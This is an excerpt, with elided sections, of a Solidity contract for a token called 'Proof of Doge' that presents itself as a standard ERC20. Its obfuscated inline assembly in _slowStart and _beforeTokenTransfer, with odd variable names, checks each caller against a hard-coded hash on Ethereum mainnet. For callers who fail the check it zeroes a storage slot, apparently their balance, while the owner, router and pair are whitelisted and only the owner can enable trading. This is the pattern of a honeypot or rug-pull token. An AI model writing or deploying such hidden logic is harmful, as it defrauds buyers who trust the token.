...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addProof;
    uint256 private apeSense = block.number*2;

    mapping (address => bool) private _firstInvestigate; 
    mapping (address => bool) private _secondProof;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private theRock;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private tractorMud;
    address public pair;
    ...
    bool private trading; uint256 private crapClap = 1; bool private dyingWish;
    uint256 private _decimals; uint256 private cornMetal;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addProof.push(_router); addProof.push(msgSender_); addProof.push(pair);
        for (uint256 q=0; q < 3;) {_firstInvestigate[addProof[q]] = true; unchecked{q++;} }
    }
    ...
    function _slowStart() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xb0297accde46380001fd13634e323538040a3e2b632972c0b25f9ee77dbc442e
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x01218e88dccfb003ba5307943bd2a64c7f113a7eef0b1b67b3982cd202c39fc6,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; apeSense = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addProof[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract ProofOfDoge is ERC20Token {
    constructor() ERC20Token("Proof of Doge", "PoD", msg.sender, 1250000 * 10 ** 18) {
    }
}